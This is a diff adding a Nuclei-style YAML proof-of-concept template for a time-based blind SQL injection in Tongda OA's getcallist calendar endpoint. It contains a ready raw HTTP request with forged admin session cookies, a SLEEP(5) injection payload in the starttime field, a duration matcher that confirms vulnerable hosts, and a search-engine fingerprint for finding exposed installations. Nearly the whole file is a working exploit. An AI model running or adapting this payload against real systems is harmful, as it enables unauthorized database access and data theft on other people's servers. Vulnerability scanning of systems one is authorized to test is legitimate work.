@@ -1,0 +1,43 @@
+id: poc-32dd072ebc5351582cca
+info:
+  name: 通达OAgetcallist存在前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/32dd072ebc5351582cca45297964c919
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 32dd072ebc5351582cca45297964c919
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=f4f833d3; UI_COOKIE=0; PHPSESSID=u1hk9v9ar46ejfd46uk7vupu23; KEY_RANDOMDATA=18528
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Content-Length: 0
+
+
+    starttime=1'' AND (SELECT 7846 FROM (SELECT(SLEEP(5)))SfMD) AND ''GpBS''=''GpBS&endtime=1598918400&view=month&condition=1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
